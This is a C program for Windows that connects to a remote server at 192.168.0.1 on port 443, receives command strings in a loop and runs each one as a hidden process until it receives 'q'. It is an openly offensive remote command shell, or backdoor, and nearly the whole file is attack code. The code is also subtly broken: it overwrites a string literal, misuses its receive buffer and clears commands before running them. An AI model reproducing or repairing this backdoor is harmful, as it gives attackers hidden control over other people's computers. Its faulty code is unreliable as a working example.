#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>

#define SERVER_ADDR "192.168.0.1"
#define PORT 443


int main(){
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;

    // Initialize Winsock library
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
        printf("Failed to initialize winsock\n");
        return 1;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET){
        printf("Failed to create socket: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set up server address structure
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);
    serverAddr.sin_port = htons(PORT);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR){
        printf("Failed to connect to the server: %ld\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connected to the server!\n");

    STARTUPINFO startupInfo = {sizeof(startupInfo)};
    PROCESS_INFORMATION processInfo;

    char* cmd[] = {"cmd.exe", NULL};

    while (TRUE){
        memset(cmd[0], '\0', strlen(cmd[0]));
        recv(sock, cmd, sizeof(cmd)/sizeof(char*) - 1, 0); // Receive command from the server

        if (strcmp(cmd[0], "q") == 0){
            break; // Exit loop on 'q' command
        } else {
            memset(cmd[0], '\0', strlen(cmd[0])); // Clear buffer
            CreateProcess(NULL, cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo);
        }
    }

    // Close handles and cleanup
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);
    closesocket(sock);
    WSACleanup();

    return 0;
}